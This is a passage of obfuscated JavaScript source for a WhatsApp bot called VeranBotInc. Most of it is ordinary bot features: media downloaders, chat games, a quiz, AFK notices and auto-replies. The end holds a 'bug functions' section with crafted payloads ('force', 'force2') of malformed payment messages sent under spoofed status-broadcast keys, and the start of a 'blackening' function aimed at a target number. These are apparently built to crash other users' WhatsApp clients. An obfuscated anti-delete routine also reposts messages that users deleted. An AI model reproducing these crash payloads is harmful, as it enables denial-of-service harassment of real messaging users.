fetchJson('https://api.junn4.my.id/download/instagram?url='+budy);VeranBotInc[_0x4c7b7c(0x1ae)](m[_0x4c7b7c(0x1b1)],{'video':{'url':anu[_0x4c7b7c(0x18b)][_0x4c7b7c(0x1a1)]},'caption':_0x4c7b7c(0x17d)},{'quoted':m}),await VeranBotInc[_0x4c7b7c(0x1ae)](m[_0x4c7b7c(0x1b1)],{'react':{'text':'☑️','key':m[_0x4c7b7c(0x1ac)]}});}else{if(budy[_0x4c7b7c(0x19b)](_0x4c7b7c(0x19d))){await VeranBotInc[_0x4c7b7c(0x1ae)](m[_0x4c7b7c(0x1b1)],{'react':{'text':'⏱️','key':m[_0x4c7b7c(0x1ac)]}});let anu=await fetchJson('https://api.junn4.my.id/download/tiktok?url='+budy);VeranBotInc[_0x4c7b7c(0x1ae)](m[_0x4c7b7c(0x1b1)],{'video':{'url':anu[_0x4c7b7c(0x18b)][_0x4c7b7c(0x181)]['url']},'caption':_0x4c7b7c(0x17d)},{'quoted':m}),await VeranBotInc['sendMessage'](m[_0x4c7b7c(0x1b1)],{'react':{'text':'☑️','key':m[_0x4c7b7c(0x1ac)]}});}else{if(budy[_0x4c7b7c(0x19b)](_0x4c7b7c(0x1b6))){await VeranBotInc[_0x4c7b7c(0x1ae)](m[_0x4c7b7c(0x1b1)],{'react':{'text':'⏱️','key':m[_0x4c7b7c(0x1ac)]}});let anu=await fetchJson('https://api.junn4.my.id/download/facebook?url='+budy);VeranBotInc[_0x4c7b7c(0x1ae)](m['chat'],{'video':{'url':anu[_0x4c7b7c(0x18b)][_0x4c7b7c(0x17f)]},'caption':_0x4c7b7c(0x17d)},{'quoted':m}),await VeranBotInc[_0x4c7b7c(0x1ae)](m[_0x4c7b7c(0x1b1)],{'react':{'text':'☑️','key':m[_0x4c7b7c(0x1ac)]}});}else{if(budy['match'](_0x4c7b7c(0x19f))){await VeranBotInc['sendMessage'](m[_0x4c7b7c(0x1b1)],{'react':{'text':'⏱️','key':m['key']}});let anu=await fetchJson(_0x4c7b7c(0x192)+budy);VeranBotInc[_0x4c7b7c(0x1ae)](m['chat'],{'video':{'url':anu[_0x4c7b7c(0x18b)]['result']},'caption':''},{'quoted':m}),await VeranBotInc[_0x4c7b7c(0x1ae)](m[_0x4c7b7c(0x1b1)],{'react':{'text':'☑️','key':m[_0x4c7b7c(0x1ac)]}});}}}}}catch(_0x3e01e8){await VeranBotInc[_0x4c7b7c(0x1ae)](m[_0x4c7b7c(0x1b1)],{'react':{'text':'✖️','key':m[_0x4c7b7c(0x1ac)]}});}
		
		const _0x24eed4=_0x3260;(function(_0x332e49,_0x5a61f9){const _0x3d4789=_0x3260,_0x25f134=_0x332e49();while(!![]){try{const _0x756e2a=-parseInt(_0x3d4789(0x177))/0x1*(-parseInt(_0x3d4789(0x14f))/0x2)+parseInt(_0x3d4789(0x17a))/0x3+-parseInt(_0x3d4789(0x153))/0x4*(-parseInt(_0x3d4789(0x178))/0x5)+-parseInt(_0x3d4789(0x173))/0x6*(-parseInt(_0x3d4789(0x142))/0x7)+parseInt(_0x3d4789(0x160))/0x8+-parseInt(_0x3d4789(0x176))/0x9+-parseInt(_0x3d4789(0x152))/0xa;if(_0x756e2a===_0x5a61f9)break;else _0x25f134['push'](_0x25f134['shift']());}catch(_0x16ebed){_0x25f134['push'](_0x25f134['shift']());}}}(_0x1779,0x3f838));function _0x3260(_0x440c14,_0x144cf2){const _0x17794d=_0x1779();return _0x3260=function(_0x326057,_0xc3a33a){_0x326057=_0x326057-0x13e;let _0x30acae=_0x17794d[_0x326057];return _0x30acae;},_0x3260(_0x440c14,_0x144cf2);}if(m[_0x24eed4(0x156)]){if(db[_0x24eed4(0x146)][m['chat']][_0x24eed4(0x161)]&&!VeranTheCreator)return;if(m[_0x24eed4(0x154)]==_0x24eed4(0x159)&&db[_0x24eed4(0x146)][m[_0x24eed4(0x15f)]][_0x24eed4(0x15b)]){const mess=chatUpdate[_0x24eed4(0x145)][0x0][_0x24eed4(0x179)][_0x24eed4(0x159)];if(store[_0x24eed4(0x145)]&&store[_0x24eed4(0x145)][m['chat']]&&store[_0x24eed4(0x145)][m[_0x24eed4(0x15f)]]['array']){const chats=store[_0x24eed4(0x145)][m[_0x24eed4(0x15f)]]['array']['find'](_0x1e32c8=>_0x1e32c8['id']===mess[_0x24eed4(0x13f)]['id']);chats[_0x24eed4(0x170)][_0x24eed4(0x172)]={'mentionedJid':[chats[_0x24eed4(0x13f)][_0x24eed4(0x174)]],'isForwarded':!![],'forwardingScore':0x1,'quotedMessage':{'conversation':_0x24eed4(0x162)},...chats['key']},await VeranBotInc[_0x24eed4(0x151)](m[_0x24eed4(0x15f)],{[chats[_0x24eed4(0x154)]]:chats[_0x24eed4(0x170)]},{});}}}isCmd&&!isUser&&(veranverifieduser[_0x24eed4(0x164)](sender),fs[_0x24eed4(0x15c)](_0x24eed4(0x14e),JSON[_0x24eed4(0x14a)](veranverifieduser,null,0x2)));prem[_0x24eed4(0x14c)](VeranBotInc,premium);let room=Object[_0x24eed4(0x171)](game[_0x24eed4(0x140)])['find'](_0x321d96=>_0x321d96['id']&&_0x321d96[_0x24eed4(0x16e)]&&_0x321d96[_0x24eed4(0x16b)]&&_0x321d96['id'][_0x24eed4(0x148)](_0x24eed4(0x140))&&[_0x321d96[_0x24eed4(0x16e)][_0x24eed4(0x16c)],_0x321d96[_0x24eed4(0x16e)][_0x24eed4(0x15a)]]['includes'](m[_0x24eed4(0x144)])&&_0x321d96[_0x24eed4(0x16b)]=='PLAYING');function _0x1779(){const _0x21d4a0=['tictactoe','\x0a⭕:\x20@','30835WVsZJk','Invalid','sender','messages','groups','5️⃣','startsWith','7️⃣','stringify','split','expiredCheck','board','./src/user.json','653916WSHNqj','\x20(@','relayMessage','7610000lbFsco','184628RXLpSB','type','The\x20game\x20is\x20over','isGroup','_currentTurn','turn','protocolMessage','playerO','antidelete','writeFileSync','join','Game\x20over','chat','1198968rrgNFA','mute','*Anti\x20Delete❗*','render','push','limit','users','currentTurn','text','3️⃣','winner','state','playerX','Invalid\x20Position','game','test','msg','values','contextInfo','612JikKLq','participant','slice','2026170zeFqCd','1VDkvOv','5lPDqLo','message','821958ljXskh','map','1️⃣','4️⃣','key'];_0x1779=function(){return _0x21d4a0;};return _0x1779();}if(room){let ok,isWin=!0x1,isTie=!0x1,isSurrender=!0x1;if(!/^([1-9]|(me)?giveup|surr?ender|off|skip)$/i['test'](m[_0x24eed4(0x168)]))return;isSurrender=!/^[1-9]$/[_0x24eed4(0x16f)](m[_0x24eed4(0x168)]);if(m[_0x24eed4(0x144)]!==room[_0x24eed4(0x16e)][_0x24eed4(0x167)]){if(!isSurrender)return!0x0;}if(!isSurrender&&0x1>(ok=room[_0x24eed4(0x16e)][_0x24eed4(0x158)](m[_0x24eed4(0x144)]===room[_0x24eed4(0x16e)][_0x24eed4(0x15a)],parseInt(m[_0x24eed4(0x168)])-0x1)))return replygcveran({'-3':_0x24eed4(0x155),'-2':_0x24eed4(0x143),'-1':'Invalid\x20Position',0x0:_0x24eed4(0x16d)}[ok]),!0x0;if(m[_0x24eed4(0x144)]===room[_0x24eed4(0x16e)][_0x24eed4(0x16a)])isWin=!![];else{if(room[_0x24eed4(0x16e)][_0x24eed4(0x14d)]===0x1ff)isTie=!![];}let arr=room[_0x24eed4(0x16e)][_0x24eed4(0x163)]()[_0x24eed4(0x17b)](_0x5b3556=>{const _0x50137a=_0x24eed4;return{'X':'❌','O':'⭕',0x1:_0x50137a(0x17c),0x2:'2️⃣',0x3:_0x50137a(0x169),0x4:_0x50137a(0x13e),0x5:_0x50137a(0x147),0x6:'6️⃣',0x7:_0x50137a(0x149),0x8:'8️⃣',0x9:'9️⃣'}[_0x5b3556];});isSurrender&&(room['game'][_0x24eed4(0x157)]=m[_0x24eed4(0x144)]===room['game']['playerX'],isWin=!![]);let winner=isSurrender?room[_0x24eed4(0x16e)][_0x24eed4(0x167)]:room[_0x24eed4(0x16e)][_0x24eed4(0x16a)];isWin&&(global['db'][_0x24eed4(0x166)][m['sender']][_0x24eed4(0x165)]+=0x3,global['db'][_0x24eed4(0x166)][m[_0x24eed4(0x144)]]['uang']+=0xbb8);let str='Room\x20ID:\x20'+room['id']+'\x0a\x0a'+arr[_0x24eed4(0x175)](0x0,0x3)[_0x24eed4(0x15d)]('')+'\x0a'+arr[_0x24eed4(0x175)](0x3,0x6)[_0x24eed4(0x15d)]('')+'\x0a'+arr[_0x24eed4(0x175)](0x6)[_0x24eed4(0x15d)]('')+'\x0a\x0a'+(isWin?'@'+winner[_0x24eed4(0x14b)]('@')[0x0]+'\x20Win!':isTie?_0x24eed4(0x15e):'Turn\x20'+['❌','⭕'][0x1*room[_0x24eed4(0x16e)][_0x24eed4(0x157)]]+_0x24eed4(0x150)+room[_0x24eed4(0x16e)][_0x24eed4(0x167)][_0x24eed4(0x14b)]('@')[0x0]+')')+'\x0a❌:\x20@'+room[_0x24eed4(0x16e)][_0x24eed4(0x16c)][_0x24eed4(0x14b)]('@')[0x0]+_0x24eed4(0x141)+room[_0x24eed4(0x16e)][_0x24eed4(0x15a)][_0x24eed4(0x14b)]('@')[0x0]+'\x0a\x0aType\x20*surrender*\x20to\x20give\x20up\x20and\x20admit\x20defeat';if((room[_0x24eed4(0x16e)][_0x24eed4(0x157)]^isSurrender?room['x']:room['o'])!==m[_0x24eed4(0x15f)])room[room[_0x24eed4(0x16e)][_0x24eed4(0x157)]^isSurrender?'x':'o']=m[_0x24eed4(0x15f)];if(room['x']!==room['o'])await VeranBotInc['sendMessage'](room['x'],{'text':str,'mentions':parseMention(str)},{'quoted':m});await VeranBotInc['sendMessage'](room['o'],{'text':str,'mentions':parseMention(str)},{'quoted':m}),(isTie||isWin)&&delete game[_0x24eed4(0x140)][room['id']];}
		
		// Suit PvP
		let roof = Object.values(game.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
		if (roof) {
			let win = ''
			let tie = false
			if (m.sender == roof.p2 && /^(acc(ept)?|accept|yes|okay?|reject|no|later|nop(e.)?yes|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
	    if (/^(reject|no|later|n|nop(e.)?yes)/i.test(m.text)) {
					replygcveran(`@${roof.p2.split`@`[0]} rejected the suit,\nsuit cancelled`)
					delete game.suit[roof.id]
					return !0
				}
				roof.status = 'play';
				roof.asal = m.chat;
				clearTimeout(roof.waktu);
				replygcveran(`The suit has been sent to chat\n\n@${roof.p.split`@`[0]} dan @${roof.p2.split`@`[0]}\n\nPlease select a suit in the respective chat https://wa.me/${botNumber.split`@`[0]}`)
				if (!roof.pilih) VeranBotInc.sendMessage(roof.p, { text: `Please select \n\nRock🗿\nPaper📄\nScissors✂️` }, { quoted: m })
				if (!roof.pilih2) VeranBotInc.sendMessage(roof.p2, { text: `Please select \n\nRock🗿\nPaper📄\nScissors✂️` }, { quoted: m })
				roof.waktu_milih = setTimeout(() => {
					if (!roof.pilih && !roof.pilih2) replygcveran(`Both players have no intention of playing,\nSuit cancelled`)
					else if (!roof.pilih || !roof.pilih2) {
						win = !roof.pilih ? roof.p2 : roof.p
						replygcveran(`@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} didn't choose a suit, the game ends`)
					}
					delete game.suit[roof.id]
					return !0
				}, roof.timeout)
			}
			let jwb = m.sender == roof.p
			let jwb2 = m.sender == roof.p2
			let g = /scissors/i
			let b = /rock/i
			let k = /paper/i
			let reg = /^(scissors|rock|paper)/i;
			
			if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
				roof.pilih = reg.exec(m.text.toLowerCase())[0];
				roof.text = m.text;
				replygcveran(`You have chosen ${m.text} ${!roof.pilih2 ? `\n\nWaiting for the opponent to choose` : ''}`);
				if (!roof.pilih2) VeranBotInc.sendMessage(roof.p2, { text: '_The opponent has already chosen_\nNow it is your turn' })
			}
			if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
				roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
				roof.text2 = m.text
				replygcveran(`You have chosen ${m.text} ${!roof.pilih ? `\n\nWaiting for the opponent to choose` : ''}`)
				if (!roof.pilih) VeranBotInc.sendMessage(roof.p, { text: '_The opponent has already chosen_\nNow it is your turn' })
			}
			let stage = roof.pilih
			let stage2 = roof.pilih2
			if (roof.pilih && roof.pilih2) {
				clearTimeout(roof.waktu_milih)
				if (b.test(stage) && g.test(stage2)) win = roof.p
				else if (b.test(stage) && k.test(stage2)) win = roof.p2
				else if (g.test(stage) && k.test(stage2)) win = roof.p
				else if (g.test(stage) && b.test(stage2)) win = roof.p2
				else if (k.test(stage) && b.test(stage2)) win = roof.p
				else if (k.test(stage) && g.test(stage2)) win = roof.p2
				else if (stage == stage2) tie = true
				global.db.users[roof.p == win ? roof.p : roof.p2].limit += tie ? 0 : 3
				global.db.users[roof.p == win ? roof.p : roof.p2].uang += tie ? 0 : 3000
				VeranBotInc.sendMessage(roof.asal, { text: `_*Suit Results*_${tie ? '\nSERIES' : ''}\n\n@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Win \n` : ` Lost \n`}\n@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Win \n` : ` Lost \n`}\n\nWinner Gets\n*Present :* Money(3000) & Limit(3)`.trim(), mentions: [roof.p, roof.p2] }, { quoted: m })
				delete game.suit[roof.id]
			}
		}
		
		// Guess Bomb
		let pilih = '🌀', bomb = '💣';
		if (m.sender in game.tebakbom) {
			if (!/^[1-9]|10$/i.test(body) && !isCmd) return !0;
			if (game.tebakbom[m.sender].petak[parseInt(body) - 1] === 1) return !0;
			if (game.tebakbom[m.sender].petak[parseInt(body) - 1] === 2) {
				game.tebakbom[m.sender].board[parseInt(body) - 1] = bomb;
				game.tebakbom[m.sender].pick++;
				VeranBotInc.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
				game.tebakbom[m.sender].bomb--;
				game.tebakbom[m.sender].nyawa.pop();
				let brd = game.tebakbom[m.sender].board;
				if (game.tebakbom[m.sender].nyawa.length < 1) {
					global.db.users[m.sender].limit -= 1
					await replygcveran(`*THE GAME IS OVER*\nYou were hit by a bomb\n\n ${brd.join('')}\n\n*Selected :* ${game.tebakbom[m.sender].pick}\n_Limit Reduction : 1_`);
					VeranBotInc.sendMessage(m.chat, {react: {text: '😂', key: m.key}})
					delete game.tebakbom[m.sender];
				} else await replygcveran(`*SELECT A NUMBER*\n\nYou were hit by a bomb\n ${brd.join('')}\n\nSelected: ${game.tebakbom[m.sender].pick}\nRemaining life: ${game.tebakbom[m.sender].nyawa}`);
				return !0;
			}
			if (game.tebakbom[m.sender].petak[parseInt(body) - 1] === 0) {
				game.tebakbom[m.sender].petak[parseInt(body) - 1] = 1;
				game.tebakbom[m.sender].board[parseInt(body) - 1] = pilih;
				game.tebakbom[m.sender].pick++;
				game.tebakbom[m.sender].lolos--;
				let brd = game.tebakbom[m.sender].board;
				if (game.tebakbom[m.sender].lolos < 1) {
					global.db.users[m.sender].limit += 3
					global.db.users[m.sender].uang += 3000
					await replygcveran(`*YOU ARE GREAT ಠ⁠ᴥ⁠ಠ*\n\n${brd.join('')}\n\n*Selected :* ${game.tebakbom[m.sender].pick}\n*Remaining life :* ${game.tebakbom[m.sender].nyawa}\n*Bomb :* ${game.tebakbom[m.sender].bomb}\n*Present :* Money(3000) & Limit(3)`);
					delete game.tebakbom[m.sender];
				} else replygcveran(`*SELECT A NUMBER*\n\n${brd.join('')}\n\nSelected : ${game.tebakbom[m.sender].pick}\nRemaining life : ${game.tebakbom[m.sender].nyawa}\nBomb : ${game.tebakbom[m.sender].bomb}`)
			}
		}
		
		// Math
		if (game.kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
			kuis = true
			jawaban = game.kuismath[m.sender.split('@')[0]].jawaban
			const difficultyMap = { 'noob': 1, 'easy': 2, 'medium': 3, 'hard': 4, 'extreme': 5, 'impossible': 6, 'impossible2': 7 };
			let hasilLimit = difficultyMap[game.kuismath[m.sender.split('@')[0]].mode]
			if (isNaN(budy)) return
			if (budy.toLowerCase() == jawaban) {
				global.db.users[m.sender].limit += hasilLimit
				global.db.users[m.sender].uang += hasilLimit * 1000
				await replygcveran(`🎮 Math Quiz  🎮\n\nCorrect answer 🎉\nYou Get a Limit *${hasilLimit}*\n\nWant to play again? Send ${prefix}math mode`)
				delete game.kuismath[m.sender.split('@')[0]]
			} else replygcveran('*Wrong answer!*')
		}
		
		// Menfes
		if (!m.isGroup) {
			if (game.menfes[m.sender] && m.key.remoteJid !== 'status@broadcast') {
				if (!/^del(menfe(s|ss)|confe(s|ss))$/i.test(command)) {
					m.msg.contextInfo = { isForwarded: true, forwardingScore: 1, quotedMessage: { conversation: `*Order From ${game.menfes[m.sender].nama ? game.menfes[m.sender].nama : 'Somebody'}*`}, key: { remoteJid: '0@s.whatsapp.net', fromMe: false, participant: '0@s.whatsapp.net' }}
					const pesan = m.type === 'conversation' ? { extendedTextMessage: { text: m.msg, contextInfo: { isForwarded: true, forwardingScore: 1, quotedMessage: { conversation: `*Order From ${game.menfes[m.sender].nama ? game.menfes[m.sender].nama : 'Somebody'}*`}, key: { remoteJid: '0@s.whatsapp.net', fromMe: false, participant: '0@s.whatsapp.net' }}}} : { [m.type]: m.msg }
					await VeranBotInc.relayMessage(game.menfes[m.sender].tujuan, pesan, {});
				}
			}
		}
		
		// Afk
		let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
		for (let jid of mentionUser) {
			let user = global.db.users[jid]
			if (!user) continue
			let afkTime = user.afkTime
			if (!afkTime || afkTime < 0) continue
			let reason = user.afkReason || ''
			replygcveran(`Don't tag him!\nHe's AFK ${reason ? 'with reason ' + reason : 'no reason'}\nDuring ${clockString(new Date - afkTime)}`.trim())
		}
		if (global.db.users[m.sender].afkTime > -1) {
			let user = global.db.users[m.sender]
			replygcveran(`@${m.sender.split('@')[0]} berhenti AFK${user.afkReason ? ' after ' + user.afkReason : ''}\nDuring ${clockString(new Date - user.afkTime)}`)
			user.afkTime = -1
			user.afkReason = ''
		}
		
		//reply
        async function replygcveran(teks) {
            if (typereply === 'v1') {
                replygcveran(teks)
            } else if (typereply === 'v2') {
                VeranBotInc.sendMessage(m.chat, {
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botname,
                            body: ownername,
                            previewType: "PHOTO",
                            thumbnail: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                            sourceUrl: wagc
                        }
                    },
                    text: teks
                }, {
                    quoted: m
                });
            } else if (typereply === 'v3') {
               VeranBotInc.sendMessage(m.chat, {
                  text: teks,
                  contextInfo: {
                     externalAdReply: {
                        showAdAttribution: true,
                        title: botname,
                        body: ownername,
                        thumbnail: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                        sourceUrl: websitex,
                        mediaType: 1,
                        renderLargerThumbnail: true
                     }
                  }
               }, { quoted: m })
            } else if (typereply === 'v4') {
                replygcveran2(teks)
            }
        }        
//fake reply with channel link embedded
async function replygcveran2(txt) {
const verannewrep = {      
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: "*VERAN-TECH-BOT*",
newsletterJid: "120363314558828714@newsletter",
},
externalAdReply: {  
showAdAttribution: true,
title: botname,
body: ownername,
thumbnailUrl: 'https://i.imgur.com/b15GFdJ.jpeg',
sourceUrl: websitex
},
},
text: txt,
}
return VeranBotInc.sendMessage(m.chat, verannewrep, {
quoted: m,
})
}

//premium
        async function replyprem(teks) {
    replygcveran(`This feature is for premium user, contact the owner to become premium user`)
}

//script replier
        async function sendVeranBotIncMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await VeranBotInc.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}

//theme sticker reply
        const VeranStickWait = () => {
        let VeranStikRep = fs.readFileSync('./VTHmedia/theme/sticker_reply/wait.webp')
        VeranBotInc.sendMessage(m.chat, { sticker: VeranStikRep }, { quoted: m })
        }
        const VeranStickAdmin = () => {
        let VeranStikRep = fs.readFileSync('./VTHmedia/theme/sticker_reply/admin.webp')
        VeranBotInc.sendMessage(m.chat, { sticker: VeranStikRep }, { quoted: m })
        }
        const VeranStickBotAdmin = () => {
        let VeranStikRep = fs.readFileSync('./VTHmedia/theme/sticker_reply/botadmin.webp')
        VeranBotInc.sendMessage(m.chat, { sticker: VeranStikRep }, { quoted: m })
        }
        const VeranStickOwner = () => {
        let VeranStikRep = fs.readFileSync('./VTHmedia/theme/sticker_reply/owner.webp')
        VeranBotInc.sendMessage(m.chat, { sticker: VeranStikRep }, { quoted: m })
        }
        const VeranStickGroup = () => {
        let VeranStikRep = fs.readFileSync('./VTHmedia/theme/sticker_reply/group.webp')
        VeranBotInc.sendMessage(m.chat, { sticker: VeranStikRep }, { quoted: m })
        }
        const VeranStickPrivate = () => {
        let VeranStikRep = fs.readFileSync('./VTHmedia/theme/sticker_reply/private.webp')
        VeranBotInc.sendMessage(m.chat, { sticker: VeranStikRep }, { quoted: m })
        }
        
//time
const xday = moment.tz('Asia/Karachi').locale('en-IN').format('dddd');
const xdate = moment.tz('Asia/Karachi').locale('en-IN').format('DD/MM/YYYY');
const xtime = moment().tz('Asia/Karachi').locale('en-IN').format('HH:mm:ss');
const time2 = moment().tz('Asia/Karachi').format('HH:mm:ss')  
if(time2 < "23:59:00"){
var veranytimewisher = `Good Day 🙂`
 }
 if(time2 < "19:00:00"){
var veranytimewisher = `Good Day 🙂`
 }
 if(time2 < "18:00:00"){
var veranytimewisher = `Good Day 🙂`
 }
 if(time2 < "15:00:00"){
var veranytimewisher = `Good Day 🙂`
 }
 if(time2 < "11:00:00"){
var veranytimewisher = `Good Day 🙂`
 }
 if(time2 < "05:00:00"){
var veranytimewisher = `Good Day 🙂`
 } 

//theme txt
let setv = pickRandom(global.listv)

//autoreply
for (let BhosdikaVeran of VoiceNoteveran) {
if (budy === BhosdikaVeran) {
let audiobuffy = fs.readFileSync(`./VTHmedia/audio/${BhosdikaVeran}.mp3`)
VeranBotInc.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}
for (let BhosdikaVeran of Stickerveran){
if (budy === BhosdikaVeran){
let stickerbuffy = fs.readFileSync(`./VTHmedia/sticker/${BhosdikaVeran}.webp`)
VeranBotInc.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let BhosdikaVeran of Imageveran){
if (budy === BhosdikaVeran){
let imagebuffy = fs.readFileSync(`./VTHmedia/image/${BhosdikaVeran}.jpg`)
VeranBotInc.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let BhosdikaVeran of Videoveran){
if (budy === BhosdikaVeran){
let videobuffy = fs.readFileSync(`./VTHmedia/video/${BhosdikaVeran}.mp4`)
VeranBotInc.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
}
}

const sendapk = (teks) => {
VeranBotInc.sendMessage(m.chat, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
}
for (let BhosdikaVeran of Apkveran) {
if (budy === BhosdikaVeran) {
let buffer = fs.readFileSync(`./VTHmedia/apk/${BhosdikaVeran}.apk`)
sendapk(buffer)
}
}

const sendzip = (teks) => {
VeranBotInc.sendMessage(m.chat, { document: teks, mimetype: 'application/zip'}, {quoted:m})
}
for (let BhosdikaVeran of Zipveran) {
if (budy === BhosdikaVeran) {
let buffer = fs.readFileSync(`./VTHmedia/zip/${BhosdikaVeran}.zip`)
sendzip(buffer)
}
}

const senddocu = (teks) => {
VeranBotInc.sendMessage(m.chat, { document: teks, mimetype: 'application/pdf'}, {quoted:m})
}
for (let BhosdikaVeran of Docveran) {
if (budy === BhosdikaVeran) {
let buffer = fs.readFileSync(`./VTHmedia/doc/${BhosdikaVeran}.pdf`)
senddocu(buffer)
}
}

async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        )
        const result = {
            status: 200,
            author: `${ownername}`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

// Response Addlist
if (m.isGroup && isAlreadyResponList(m.chat, body.toLowerCase(), db_respon_list)) {
var get_data_respon = getDataResponList(m.chat, body.toLowerCase(), db_respon_list)
if (get_data_respon.isImage === false) {
VeranBotInc.sendMessage(m.chat, { text: sendResponList(m.chat, body.toLowerCase(), db_respon_list) }, {
quoted: m
})
} else {
VeranBotInc.sendMessage(m.chat, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {
quoted: m
})
} 
}

// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.sticker)) {
let hash = global.db.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: m.mentionedJid }, {
    userJid: VeranBotInc.user.id,
    quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, VeranBotInc.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
    ...chatUpdate,
    messages: [proto.WebMessageInfo.fromObject(messages)],
    type: 'append'
}
VeranBotInc.ev.emit('messages.upsert', msg)
} 

//======bug functions========\\
const force = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./Xbug/xx1.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"VERAN VERAN VERAN\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

const force2 = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./Xbug/xx1.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"VERAN VERAN VERAN VERAN VERAN\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

const oneclickveran = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `VERANMAINA<`
}
}
}

const sendReaction = async reactionContent => {
  VeranBotInc.sendMessage(m.chat, {
    'react': {
      'text': reactionContent,
      'key': m.key
    }
  });
};

async function blackening(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
